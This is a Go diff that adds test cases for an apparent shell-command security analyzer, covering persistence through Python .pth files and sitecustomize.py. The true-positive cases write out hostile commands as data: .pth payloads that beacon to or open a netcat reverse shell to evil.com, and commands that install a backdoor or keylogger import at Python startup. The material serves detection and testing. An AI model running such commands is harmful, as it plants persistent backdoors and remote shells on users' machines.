@@ -2704,6 +2704,7 @@ func AllPersistenceEvasionCases() []TestCase {
 	all = append(all, ReadlineMacroInjectionCases...)
 	all = append(all, CompletionCodeExecCases...)
 	all = append(all, ELFBinaryRewritingCases...)
+	all = append(all, PythonPthPersistenceCases...)
 	return all
 }
 
@@ -3505,5 +3506,134 @@ var CompletionCodeExecCases = []TestCase{
 		Analyzer:         "regex",
 		Description:      "complete -W provides static word list — no code execution. Gets default AUDIT but NOT BLOCK.",
 		Tags:             []string{"tn", "safe", "completion"},
+	},
+}
+
+// ---------------------------------------------------------------------------
+// Python .pth File and sitecustomize.py Persistence
+// Taxonomy: persistence-evasion/shell-init/python-pth-persistence
+//
+// Python's site module processes .pth files in site-packages on every Python
+// invocation. A .pth file with "import os; os.system('...')" executes code
+// silently on every Python script, pip install, pytest run, etc.
+// sitecustomize.py and usercustomize.py are imported during Python startup.
+// ---------------------------------------------------------------------------
+
+var PythonPthPersistenceCases = []TestCase{
+
+	// --- TRUE POSITIVES: Must be BLOCKED ---
+
+	{
+		ID:               "TP-PTH-001",
+		Command:          `echo 'import os; os.system("curl evil.com/beacon")' > /usr/lib/python3/dist-packages/evil.pth`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Writing a .pth file with code execution payload to system site-packages — fires on every Python invocation.",
+		Tags:             []string{"tp", "persistence", "python", "critical"},
+	},
+	{
+		ID:               "TP-PTH-002",
+		Command:          `tee ~/.local/lib/python3.11/site-packages/backdoor.pth <<< 'import subprocess; subprocess.Popen(["bash","-c","nc -e /bin/sh evil.com 4444"])'`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "tee writing reverse shell .pth to user site-packages — persistent reverse shell on every Python startup.",
+		Tags:             []string{"tp", "persistence", "python"},
+	},
+	{
+		ID:               "TP-PTH-003",
+		Command:          `cp /tmp/payload.pth /usr/local/lib/python3.12/dist-packages/z_innocent.pth`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Copying a pre-built .pth payload into dist-packages — innocuous filename hides the persistence.",
+		Tags:             []string{"tp", "persistence", "python"},
+	},
+	{
+		ID:               "TP-PTH-004",
+		Command:          `mv backdoor.py /usr/lib/python3/dist-packages/sitecustomize.py`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Moving a file to sitecustomize.py — auto-imported before any Python user code runs.",
+		Tags:             []string{"tp", "persistence", "python", "critical"},
+	},
+	{
+		ID:               "TP-PTH-005",
+		Command:          `echo 'import keylogger' > /usr/lib/python3/dist-packages/usercustomize.py`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Writing usercustomize.py — Python imports this on startup, loading arbitrary modules.",
+		Tags:             []string{"tp", "persistence", "python"},
+	},
+	{
+		ID:               "TP-PTH-006",
+		Command:          `cat payload.py > ~/.local/lib/python3.11/site-packages/sitecustomize.py`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "cat redirect writing to user sitecustomize.py — persistent startup execution.",
+		Tags:             []string{"tp", "persistence", "python"},
+	},
+
+	// --- TRUE NEGATIVES: Must be ALLOWED ---
+
+	{
+		ID:               "TN-PTH-001",
+		Command:          `pip install requests`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "pip install — legitimate Python package installation, not direct .pth write.",
+		Tags:             []string{"tn", "safe", "python"},
+	},
+	{
+		ID:               "TN-PTH-002",
+		Command:          `python3 -m site --user-site`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Querying site-packages path — read-only reconnaissance, not writing.",
+		Tags:             []string{"tn", "safe", "python"},
+	},
+	{
+		ID:               "TN-PTH-003",
+		Command:          `cat /usr/lib/python3/dist-packages/easy-install.pth`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Reading an existing .pth file — cat prefix gets ALLOW from ts-allow-readonly, no redirect operator.",
+		Tags:             []string{"tn", "safe", "python"},
+	},
+	{
+		ID:               "TN-PTH-004",
+		Command:          `ls /usr/lib/python3/dist-packages/*.pth`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Listing .pth files — passive reconnaissance, allowed.",
+		Tags:             []string{"tn", "safe", "python"},
+	},
+	{
+		ID:               "TN-PTH-005",
+		Command:          `echo "hello" > /tmp/test.txt`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "persistence-evasion/shell-init/python-pth-persistence",
+		Analyzer:         "regex",
+		Description:      "Echo writing to a regular /tmp file — not a .pth file, not in site-packages. ALLOW from ts-allow-readonly.",
+		Tags:             []string{"tn", "safe"},
 	},
 }
